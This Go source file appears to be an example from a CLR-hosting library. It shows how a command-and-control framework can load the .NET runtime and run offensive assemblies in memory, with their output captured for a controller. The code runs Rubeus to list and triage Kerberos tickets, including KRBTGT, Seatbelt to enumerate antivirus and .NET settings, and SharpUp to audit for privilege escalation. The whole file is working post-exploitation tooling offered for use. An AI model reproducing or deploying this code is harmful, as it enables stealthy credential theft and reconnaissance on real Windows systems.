// +build windows

// C2Framework is an example of how a Command & Control (C2) Framework could load the CLR,
// Load in an assembly, and execute it multiple time. This prevents the need to send the
// assembly down the wire multiple times. The examples also captures STDOUT/STDERR so they
// can be returned to the contorller.

package main

import (
	// Standard
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"os"

	clr "github.com/Ne0nd0g/go-clr"
)

func main() {
	verbose := flag.Bool("v", false, "Enable verbose output")
	debug := flag.Bool("debug", false, "Enable debug output")
	flag.Usage = func() {
		flag.PrintDefaults()
		os.Exit(0)
	}
	flag.Parse()

	rubeusPath := `C:\Users\bob\Desktop\Rubeus4.exe`
	seatbeltPath := `C:\Users\bob\Desktop\Seatbelt4.exe`
	sharpupPath := `C:\Users\bob\Desktop\SharpUp4.exe`

	if *debug {
		clr.Debug = true
	}

	// Redirect the program's STDOUT/STDERR to capture CLR assembly execution output
	if *verbose {
		fmt.Println("[-] Redirecting programs STDOUT/STDERR for CLR assembly exection...")
	}
	err := clr.RedirectStdoutStderr()
	if err != nil {
		log.Fatal(err)
	}

	// Load the CLR and an ICORRuntimeHost instance
	if *verbose {
		fmt.Println("[-] Loading the CLR into this process...")
	}
	runtimeHost, err := clr.LoadCLR("v4")
	if err != nil {
		log.Fatal(err)
	}
	if *debug {
		fmt.Printf("[DEBUG] Returned ICORRuntimeHost: %+v\n", runtimeHost)
	}

	// Get Rubeus
	rubeusBytes, err := ioutil.ReadFile(rubeusPath)
	if err != nil {
		log.Fatal(fmt.Sprintf("there was an error reading in the Rubeus file from %s:\n%s", rubeusPath, err))
	}
	if *verbose {
		fmt.Printf("[-] Ingested %d assembly bytes\n", len(rubeusBytes))
	}

	// Load assembly into default AppDomain
	if *verbose {
		fmt.Println("[-] Loading Rubeus into default AppDomain...")
	}
	methodInfo, err := clr.LoadAssembly(runtimeHost, rubeusBytes)
	if err != nil {
		log.Fatal(err)
	}
	if *debug {
		fmt.Printf("[DEBUG] Returned MethodInfo: %+v\n", methodInfo)
	}

	// Execute assembly from default AppDomain
	if *verbose {
		fmt.Println("[-] Executing Rubeus...")
	}
	stdout, stderr := clr.InvokeAssembly(methodInfo, []string{"klist"})
	if *debug {
		fmt.Printf("[DEBUG] Returned STDOUT/STDERR\nSTDOUT: %s\nSTDERR: %s\n", stdout, stderr)
	}

	// Print returned output
	if stderr != "" {
		fmt.Printf("[!] STDERR:\n%s\n", stderr)
	}
	if stdout != "" {
		fmt.Printf("[+] STDOUT:\n%s\n", stdout)
	}

	// Execute assembly from default AppDomain x2
	if *verbose {
		fmt.Println("[-] Executing the Rubeus x2...")
	}
	stdout, stderr = clr.InvokeAssembly(methodInfo, []string{"triage", "/service:KRBTGT"})
	if *debug {
		fmt.Printf("[DEBUG] Returned STDOUT/STDERR\nSTDOUT: %s\nSTDERR: %s\n", stdout, stderr)
	}

	// Print returned output
	if stderr != "" {
		fmt.Printf("[!] STDERR:\n%s\n", stderr)
	}
	if stdout != "" {
		fmt.Printf("[+] STDOUT:\n%s\n", stdout)
	}

	// Get Seatbelt
	seatbeltBytes, err := ioutil.ReadFile(seatbeltPath)
	if err != nil {
		log.Fatal(fmt.Sprintf("there was an error reading in the Seatbelt file from %s:\n%s", seatbeltPath, err))
	}

	// Load assembly into default AppDomain
	if *verbose {
		fmt.Println("[-] Loading Seatbelt into default AppDomain...")
	}
	seatBelt, err := clr.LoadAssembly(runtimeHost, seatbeltBytes)
	if err != nil {
		log.Fatal(err)
	}
	if *debug {
		fmt.Printf("[DEBUG] Returned MethodInfo: %+v\n", seatBelt)
	}

	// Execute assembly from default AppDomain
	if *verbose {
		fmt.Println("[-] Executing Seatbelt...")
	}
	stdout, stderr = clr.InvokeAssembly(seatBelt, []string{"AntiVirus"})
	if *debug {
		fmt.Printf("[DEBUG] Returned STDOUT/STDERR\nSTDOUT: %s\nSTDERR: %s\n", stdout, stderr)
	}

	// Print returned output
	if stderr != "" {
		fmt.Printf("[!] STDERR:\n%s\n", stderr)
	}
	if stdout != "" {
		fmt.Printf("[+] STDOUT:\n%s\n", stdout)
	}

	// Execute assembly from default AppDomain x2
	if *verbose {
		fmt.Println("[-] Executing Seatbelt x2...")
	}
	stdout, stderr = clr.InvokeAssembly(seatBelt, []string{"DotNet"})
	if *debug {
		fmt.Printf("[DEBUG] Returned STDOUT/STDERR\nSTDOUT: %s\nSTDERR: %s\n", stdout, stderr)
	}

	// Print returned output
	if stderr != "" {
		fmt.Printf("[!] STDERR:\n%s\n", stderr)
	}
	if stdout != "" {
		fmt.Printf("[+] STDOUT:\n%s\n", stdout)
	}

	// Get SharpUp
	sharpUpBytes, err := ioutil.ReadFile(sharpupPath)
	if err != nil {
		log.Fatal(fmt.Sprintf("there was an error reading in the SharpUp file from %s:\n%s", sharpupPath, err))
	}

	// Load assembly into default AppDomain
	if *verbose {
		fmt.Println("[-] Loading SharpUp into default AppDomain...")
	}
	sharpUp, err := clr.LoadAssembly(runtimeHost, sharpUpBytes)
	if err != nil {
		log.Fatal(err)
	}
	if *debug {
		fmt.Printf("[DEBUG] Returned MethodInfo: %+v\n", sharpUp)
	}

	// Execute assembly from default AppDomain
	if *verbose {
		fmt.Println("[-] Executing SharpUp...")
	}
	stdout, stderr = clr.InvokeAssembly(sharpUp, []string{"audit"})
	if *debug {
		fmt.Printf("[DEBUG] Returned STDOUT/STDERR\nSTDOUT: %s\nSTDERR: %s\n", stdout, stderr)
	}

	// Print returned output
	if stderr != "" {
		fmt.Printf("[!] STDERR:\n%s\n", stderr)
	}
	if stdout != "" {
		fmt.Printf("[+] STDOUT:\n%s\n", stdout)
	}
}
